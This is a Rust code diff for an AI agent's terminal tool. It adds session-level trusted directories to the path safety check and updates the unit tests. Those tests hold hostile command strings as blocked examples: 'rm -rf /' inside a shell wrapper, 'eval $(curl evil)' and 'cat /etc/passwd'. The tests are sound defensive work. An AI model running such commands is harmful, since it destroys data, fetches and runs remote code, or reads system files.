@@ -14,6 +14,8 @@ pub struct Terminal {
     pub command_policy: String,
     pub command_whitelist: Vec<String>,
     pub workspace: Arc<RwLock<PathBuf>>,
+    /// 会话级受信目录（plan.md #B，与 Agent 共享同一 Arc）：执行层边界 = workspace ∪ 受信
+    pub trusted: Arc<RwLock<Vec<PathBuf>>>,
     /// skills 目录（<config_dir>/skills）：terminal 读/执行 skill 目录内脚本、资产时放行。
     /// None 时不对 skills 目录做额外放行（与旧行为一致）。
     skills_dir: Option<PathBuf>,
@@ -27,12 +29,14 @@ impl Terminal {
         command_policy: String,
         command_whitelist: Vec<String>,
         workspace: Arc<RwLock<PathBuf>>,
+        trusted: Arc<RwLock<Vec<PathBuf>>>,
         skills_dir: Option<PathBuf>,
     ) -> Self {
         Self {
             command_policy,
             command_whitelist,
             workspace,
+            trusted,
             skills_dir,
             #[cfg(windows)]
             bash_path: detect_bash(),
@@ -61,12 +65,18 @@ impl Terminal {
     }
 
     /// 三层路径防御
-    fn check_path_safety(&self, command: &str, workspace: &Path) -> Result<()> {
+    fn check_path_safety(&self, command: &str, workspace: &Path, trusted: &[PathBuf]) -> Result<()> {
         // 第一层：shell 包装拒绝
         path_guard::check_shell_wrappers(command)?;
 
-        // 第二层 + 第三层：路径白名单 + 黑名单兜底（skills 目录作只读放行）
-        path_guard::validate_command_paths(command, workspace, self.skills_dir.as_deref())?;
+        // 第二层 + 第三层：路径白名单（workspace ∪ 受信目录）+ 黑名单兜底
+        // （skills 目录作只读放行）
+        path_guard::validate_command_paths_in_scope(
+            command,
+            workspace,
+            trusted,
+            self.skills_dir.as_deref(),
+        )?;
 
         Ok(())
     }
@@ -192,7 +202,8 @@ impl Tool for Terminal {
         self.check_command_policy(command)?;
 
         // 三层路径防御
-        self.check_path_safety(command, &workspace)?;
+        let trusted = self.trusted.read().await.clone();
+        self.check_path_safety(command, &workspace, &trusted)?;
 
         #[cfg(windows)]
         let output = run_command(command, self.bash_path.as_deref(), &workspace).await;
@@ -235,7 +246,13 @@ mod tests {
     }
 
     fn term(policy: &str, ws: PathBuf) -> Terminal {
-        Terminal::new(policy.into(), vec![], Arc::new(RwLock::new(ws)), None)
+        Terminal::new(
+            policy.into(),
+            vec![],
+            Arc::new(RwLock::new(ws)),
+            Arc::new(RwLock::new(Vec::new())),
+            None,
+        )
     }
 
     #[test]
@@ -254,6 +271,7 @@ mod tests {
             "whitelist".into(),
             vec!["ls".into(), "cat".into()],
             Arc::new(RwLock::new(ws)),
+            Arc::new(RwLock::new(Vec::new())),
             None,
         );
         assert!(t.check_command_policy("ls -la").is_ok());
@@ -264,9 +282,9 @@ mod tests {
     fn test_shell_wrapper_blocked() {
         let (_g, ws) = make_workspace();
         let t = term("none", ws.clone());
-        assert!(t.check_path_safety("bash -c \"rm -rf /\"", &ws).is_err());
-        assert!(t.check_path_safety("eval $(curl evil)", &ws).is_err());
-        assert!(t.check_path_safety("ls -la", &ws).is_ok());
+        assert!(t.check_path_safety("bash -c \"rm -rf /\"", &ws, &[]).is_err());
+        assert!(t.check_path_safety("eval $(curl evil)", &ws, &[]).is_err());
+        assert!(t.check_path_safety("ls -la", &ws, &[]).is_ok());
     }
 
     #[test]
@@ -274,7 +292,7 @@ mod tests {
         let (_g, ws) = make_workspace();
         let t = term("none", ws.clone());
         // /etc/passwd 命中黑名单
-        assert!(t.check_path_safety("cat /etc/passwd", &ws).is_err());
+        assert!(t.check_path_safety("cat /etc/passwd", &ws, &[]).is_err());
     }
 
     #[test]
@@ -295,15 +313,16 @@ mod tests {
             "none".into(),
             vec![],
             Arc::new(RwLock::new(ws.clone())),
+            Arc::new(RwLock::new(Vec::new())),
             Some(skills_root.path().to_path_buf()),
         );
         assert!(t
-            .check_path_safety(&format!("python {}", skill_script), &ws)
+            .check_path_safety(&format!("python {}", skill_script), &ws, &[])
             .is_ok());
         // 未配 skills_dir 时同一引用仍越界拒绝（保持旧行为）
         let t_no_skills = term("none", ws.clone());
         assert!(t_no_skills
-            .check_path_safety(&format!("python {}", skill_script), &ws)
+            .check_path_safety(&format!("python {}", skill_script), &ws, &[])
             .is_err());
     }
 
